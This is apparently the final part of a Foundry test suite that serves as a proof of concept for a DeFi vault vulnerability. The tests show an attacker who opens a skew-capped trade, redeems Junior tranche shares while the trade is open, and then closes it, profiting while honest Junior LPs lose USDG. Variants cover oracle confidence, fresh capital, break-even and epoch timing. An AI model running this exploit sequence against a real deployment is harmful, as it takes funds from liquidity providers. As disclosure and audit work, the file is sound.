        r.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function _attackVsControl(
        Plan memory attack
    ) internal returns (Result memory c, Result memory a) {
        Plan memory control = Plan(false, attack.redeem, attack.redeemer, attack.trader, attack.conf);
        uint256 snap = vm.snapshotState();
        c = _run(control);
        vm.revertToState(snap);
        a = _run(attack);
    }

    function _victimTotal(
        Result memory r
    ) internal pure returns (int256) {
        return int256(r.victimClaimUsdg + r.victimResidualValue);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Logging helpers (6-decimal USDG)
    // ------------------------------------------------------------------------------------------------------------

    function _usd(
        string memory label,
        int256 v
    ) internal pure {
        uint256 abs = v < 0 ? uint256(-v) : uint256(v);
        string memory frac = vm.toString(abs % 1e6);
        while (bytes(frac).length < 6) {
            frac = string.concat("0", frac);
        }
        console2.log(string.concat(label, ": ", v < 0 ? "-" : "", vm.toString(abs / 1e6), ".", frac));
    }

    function _usd(
        string memory label,
        uint256 v
    ) internal pure {
        _usd(label, int256(v));
    }

    function _logTrade(
        Result memory a
    ) internal pure {
        _usd("pool depth at open D", a.depthAtOpen);
        _usd("notional N (40% skew cap)", a.notional);
        _usd("VPI charged V", a.vpiCharged);
        _usd("open execution fee to treasury", a.treasuryOpenFee);
        _usd("Junior totalAssets before open", a.juniorAssetsBeforeOpen);
        _usd("Junior totalAssets after open", a.juniorAssetsAfterOpen);
        _usd("pool depth at close", a.depthAtClose);
        // Logged for context only: the curve value before the lifetime clamp, 0.01 * N^2 / (2 * depth at close).
        _usd("uncapped close VPI magnitude (curve)", a.notional * a.notional / 100 / (2 * a.depthAtClose));
        _usd("close rebate assessed", a.rebateAssessed);
        _usd("close rebate paid", a.rebatePaid);
        _usd("close rebate waived", a.rebateWaived);
        _usd("trader round-trip PnL", a.traderPnl);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------

    /// @notice Deliberate cycle. The attacker holds 60% of Junior, redeems in full while its own skew-cap position
    ///         is open, then closes. It profits; the honest Junior receives fewer USDG for the same shares.
    function test_Deliberate_AttackerProfits_VictimReceivesLessUsdg() public {
        _seedLps(4_000_000e6, 3_600_000e6, 2_400_000e6);
        (Result memory c, Result memory a) = _attackVsControl(Plan(true, true, ATTACKER, ATTACKER, 0));

        _logTrade(a);
        _usd("attacker redemption USDG, control", c.redeemerUsdg);
        _usd("attacker redemption USDG, attack", a.redeemerUsdg);
        int256 uplift = int256(a.redeemerUsdg) - int256(c.redeemerUsdg);
        _usd("redemption uplift", uplift);
        int256 attackerGain = uplift + a.traderPnl;
        _usd("ATTACKER NET GAIN vs control", attackerGain);
        _usd("victim claim USDG, control", c.victimClaimUsdg);
        _usd("victim claim USDG, attack", a.victimClaimUsdg);
        _usd("VICTIM REALIZED USDG SHORTFALL", int256(c.victimClaimUsdg) - int256(a.victimClaimUsdg));
        _usd("victim residual-share value loss", int256(c.victimResidualValue) - int256(a.victimResidualValue));
        int256 victimLoss = _victimTotal(c) - _victimTotal(a);
        _usd("VICTIM TOTAL LOSS vs control", victimLoss);
        _usd("Senior totalAssets change", int256(a.seniorAssets) - int256(c.seniorAssets));
        _usd("treasury change", int256(a.treasury) - int256(c.treasury));

        // Known value: V = vpiFactor * N^2 / (2 * D) = 0.01 * 4,000,000^2 / (2 * 10,000,002) = 7,999.998400 USDG.
        assertEq(a.notional, 4_000_000e6, "N = 40% of D, whole lots");
        assertApproxEqAbs(a.vpiCharged, 7_999_998_400, 1, "V matches the VPI curve");
        assertEq(a.treasuryOpenFee, 1600e6, "open fee = 4 bps of N");
        assertEq(a.rebateWaived, 0, "rebate is fully paid from pool cash");
        assertEq(a.rebatePaid, a.vpiCharged - 1600e6, "clamp binds: rebate = V - close fee");
        assertGt(uplift, 0, "redemption is priced with V included");
        assertGt(attackerGain, 0, "attacker profits");
        assertGt(c.victimClaimUsdg, a.victimClaimUsdg, "victim receives fewer USDG tokens for identical shares");
        assertGt(victimLoss, attackerGain, "victim loses the attacker's gain plus the open fee");
        assertEq(a.seniorAssets, c.seniorAssets, "Senior unaffected");
    }

    /// @notice Same cycle with every Pyth feed at the maximum accepted confidence (10 bps; 2.5 bps adverse shift on
    ///         both legs).
    function test_Deliberate_AtMaxAcceptedConfidence() public {
        _seedLps(4_000_000e6, 3_600_000e6, 2_400_000e6);
        (Result memory c, Result memory a) = _attackVsControl(Plan(true, true, ATTACKER, ATTACKER, MAX_CONF));

        _logTrade(a);
        int256 attackerGain = int256(a.redeemerUsdg) - int256(c.redeemerUsdg) + a.traderPnl;
        int256 victimLoss = _victimTotal(c) - _victimTotal(a);
        _usd("ATTACKER NET GAIN vs control", attackerGain);
        _usd("VICTIM REALIZED USDG SHORTFALL", int256(c.victimClaimUsdg) - int256(a.victimClaimUsdg));
        _usd("VICTIM TOTAL LOSS vs control", victimLoss);

        assertGt(attackerGain, 0, "attacker still profits at the confidence ceiling");
        assertGt(victimLoss, 0, "victim still loses");
    }

    /// @notice No attacker. An unrelated trader holds a skew-cap position across the settlement and an honest Junior
    ///         LP happens to redeem; it is overpaid and the remaining Junior LP funds the refund.
    function test_Passive_HonestRedeemerOverpaid_RemainingJuniorPays() public {
        _seedLps(4_000_000e6, 3_600_000e6, 2_400_000e6);
        uint256 snap = vm.snapshotState();
        Result memory noTrade = _run(Plan(false, true, ATTACKER, OTHER_TRADER, 0));
        vm.revertToState(snap);
        Result memory tradeNoRedeem = _run(Plan(true, false, ATTACKER, OTHER_TRADER, 0));
        vm.revertToState(snap);
        Result memory a = _run(Plan(true, true, ATTACKER, OTHER_TRADER, 0));

        _logTrade(a);
        int256 overpaid = int256(a.redeemerUsdg) - int256(noTrade.redeemerUsdg);
        _usd("honest redeemer uplift vs no-trade", overpaid);
        _usd("remaining Junior loss vs no-trade", _victimTotal(noTrade) - _victimTotal(a));
        // Isolate the LP-to-LP transfer from the trade's own effect on the pool (fees stay with LPs either way).
        _usd("remaining Junior change, trade without redemption", _victimTotal(tradeNoRedeem) - _victimTotal(noTrade));
        int256 transferred = _victimTotal(tradeNoRedeem) - _victimTotal(a);
        _usd("REMAINING JUNIOR LOSS caused by the redemption", transferred);

        assertGt(overpaid, 0, "honest redeemer is overpaid");
        assertGt(_victimTotal(tradeNoRedeem), _victimTotal(noTrade), "without a redemption the trade benefits LPs");
        assertGt(transferred, 0, "the redemption shifts value away from the remaining Junior");
    }

    /// @notice The attacker needs capital, not an existing share. Honest pool: Senior 6M / Junior 4M. The attacker
    ///         deposits 14M of fresh Junior capital through the public async flow and runs one cycle.
    function test_FreshCapital_AttackerDepositsIntoHonestPool() public {
        _seedLps(6_000_000e6, 14_000_000e6, 4_000_000e6);
        (Result memory c, Result memory a) = _attackVsControl(Plan(true, true, ATTACKER, ATTACKER, 0));

        _logTrade(a);
        int256 attackerGain = int256(a.redeemerUsdg) - int256(c.redeemerUsdg) + a.traderPnl;
        int256 victimLoss = _victimTotal(c) - _victimTotal(a);
        _usd("ATTACKER NET GAIN vs control", attackerGain);
        _usd("VICTIM REALIZED USDG SHORTFALL", int256(c.victimClaimUsdg) - int256(a.victimClaimUsdg));
        _usd("VICTIM TOTAL LOSS vs control", victimLoss);
        console2.log("victim loss / 4M deposit (bps x100)", uint256(victimLoss) * 1e6 / 4_000_000e6);

        assertGt(attackerGain, 0, "attacker profits");
        assertGt(victimLoss, attackerGain, "victim loses more than the attacker gains");
        assertEq(a.seniorAssets, c.seniorAssets, "Senior unaffected");
    }

    /// @notice The refund does not depend on any redemption: the clamp returns V minus the close fee whether or not an
    ///         LP left. The loss comes from pricing V into NAV, not from depth manipulation.
    function test_RefundIndependentOfRedemption() public {
        _seedLps(4_000_000e6, 3_600_000e6, 2_400_000e6);
        uint256 snap = vm.snapshotState();
        Result memory noRedeem = _run(Plan(true, false, ATTACKER, ATTACKER, 0));
        vm.revertToState(snap);
        Result memory withRedeem = _run(Plan(true, true, ATTACKER, ATTACKER, 0));

        _usd("VPI charged V", noRedeem.vpiCharged);
        _usd("close rebate paid, no redemption", noRedeem.rebatePaid);
        _usd("close rebate paid, with redemption", withRedeem.rebatePaid);
        _usd("difference", int256(withRedeem.rebatePaid) - int256(noRedeem.rebatePaid));

        assertEq(noRedeem.rebateWaived, 0);
        assertEq(withRedeem.rebateWaived, 0);
        assertEq(noRedeem.vpiCharged, withRedeem.vpiCharged, "same open in both branches");
        uint256 closeFee = withRedeem.notional * 4 / 10_000;
        // With the redemption the clamp binds exactly: rebate = V - close fee. The redemption cannot push it higher.
        assertEq(withRedeem.rebatePaid, withRedeem.vpiCharged - closeFee, "clamp caps the refund at V - fee");
        // Without any redemption the raw close VPI is already within 0.2% of V: the refund is essentially the same.
        assertLe(noRedeem.rebatePaid, withRedeem.rebatePaid);
        assertGe(noRedeem.rebatePaid * 1000, withRedeem.rebatePaid * 998, "refund within 0.2% without a redemption");
    }

    /// @notice Below break-even (f = 0.30) the attacker loses, yet the honest Junior still loses about the same amount:
    ///         the transfer exists at any share, profit only decides who pays for it.
    function test_BelowBreakEven_VictimStillLoses() public {
        _seedLps(4_000_000e6, 1_800_000e6, 4_200_000e6);
        (Result memory c, Result memory a) = _attackVsControl(Plan(true, true, ATTACKER, ATTACKER, 0));

        int256 attackerGain = int256(a.redeemerUsdg) - int256(c.redeemerUsdg) + a.traderPnl;
        int256 victimLoss = _victimTotal(c) - _victimTotal(a);
        _usd("redemption uplift", int256(a.redeemerUsdg) - int256(c.redeemerUsdg));
        _usd("ATTACKER NET GAIN vs control", attackerGain);
        _usd("VICTIM TOTAL LOSS vs control", victimLoss);

        assertLt(attackerGain, 0, "below break-even the attacker loses");
        assertGt(victimLoss, 0, "the honest Junior still loses");
    }

    /// @notice Inside an existing 60/40 tranche the Junior-withdrawal covenant (Junior must keep at least
    ///         (10,000 - 8,000) / 8,000 = 25% of Senior exposure) bounds the attacker's share; at f = 0.625 the
    ///         redemption is already capped (accrued coupon raises the requirement); at f = 0.6225 it funds in full.
    function test_SeniorCovenantBoundShare() public {
        _seedLps(6_000_000e6, 2_490_000e6, 1_510_000e6);
        victimValueOnly = true; // after the attacker exits, the honest Junior is pinned at the covenant
        (Result memory c, Result memory a) = _attackVsControl(Plan(true, true, ATTACKER, ATTACKER, 0));

        _logTrade(a);
        int256 attackerGain = int256(a.redeemerUsdg) - int256(c.redeemerUsdg) + a.traderPnl;
        int256 victimLoss = _victimTotal(c) - _victimTotal(a);
        _usd("ATTACKER NET GAIN vs control", attackerGain);
        _usd("VICTIM SHARE-VALUE LOSS vs control", victimLoss);
        console2.log("victim loss / 1.51M deposit (bps x100)", uint256(victimLoss) * 1e6 / 1_510_000e6);

        assertGt(attackerGain, 0, "attacker profits");
        assertGt(victimLoss, attackerGain, "victim loses more than the attacker gains");
        assertEq(a.seniorAssets, c.seniorAssets, "Senior unaffected");
    }

    /// @notice Timing. A fresh Junior deposit requested at e0 + 60 s activates at e0 + 1 h; its shares can be queued
    ///         for redemption after the 1 h cooldown, and that redemption funds at e0 + 3 h. Separately, a Junior LP that
    ///         tries to join an epoch after its 300 s cutoff (e.g. after seeing the attacker's open) lands one epoch later.
    function test_CycleTiming() public {
        _seedLps(4_000_000e6, 3_600_000e6, 2_400_000e6);
        uint256 e0 = vm.getBlockTimestamp();
        assertEq(e0 % 3600, 0, "start on an epoch boundary");
        address fresh = address(0xF4E5);
        uint256 amount = 1_000_000e6;

        vm.warp(e0 + 60);
        settlementToken.mint(fresh, amount);
        vm.startPrank(fresh);
        settlementToken.approve(address(juniorVault), amount);
        uint256 depositId = juniorVault.requestDeposit(amount, fresh, fresh);
        vm.stopPrank();
        uint256 activation = juniorVault.depositEpochStart(depositId);
        vm.warp(activation);
        _settleEpoch();
        uint256 claimable = juniorVault.claimableDepositRequest(depositId, fresh);
        assertEq(claimable, amount, "deposit activated in full");
        vm.prank(fresh);
        uint256 shares = juniorVault.claimDeposit(depositId, claimable, fresh, fresh);
        assertEq(juniorVault.maxRequestRedeem(fresh), 0, "fresh shares are in cooldown");

        uint256 unlock = juniorVault.lastDepositTime(fresh) + juniorVault.DEPOSIT_COOLDOWN();
        vm.warp(unlock);
        assertGt(juniorVault.maxRequestRedeem(fresh), 0, "cooldown elapsed");
        vm.prank(fresh);
        uint256 redeemId = juniorVault.requestRedeem(shares, fresh, fresh);
        uint256 maturity = juniorVault.depositEpochStart(redeemId);
        vm.warp(maturity);
        _settleEpoch();
        assertEq(juniorVault.claimableRedeemRequest(redeemId, fresh), shares, "redemption fully funded");

        console2.log("deposit activation (s from e0)", activation - e0);
        console2.log("redeem request allowed (s from e0)", unlock - e0);
        console2.log("earliest funded redemption (s from e0)", maturity - e0);
        assertEq(maturity - e0, 3 hours, "deposit-to-funded-redemption cycle is 3 epochs");

        // A request made 120 s before a boundary (inside the 300 s cutoff) targets the boundary after it.
        uint256 boundary = (vm.getBlockTimestamp() / 3600 + 1) * 3600;
        vm.warp(boundary - 120);
        uint256 late = juniorVault.balanceOf(VICTIM) / 10;
        vm.prank(VICTIM);
        uint256 lateId = juniorVault.requestRedeem(late, VICTIM, VICTIM);
        console2.log(
            "after-cutoff request targets (s after the next boundary)", juniorVault.depositEpochStart(lateId) - boundary
        );
        assertEq(juniorVault.depositEpochStart(lateId), boundary + 1 hours, "after cutoff: one epoch later");
    }

}
```


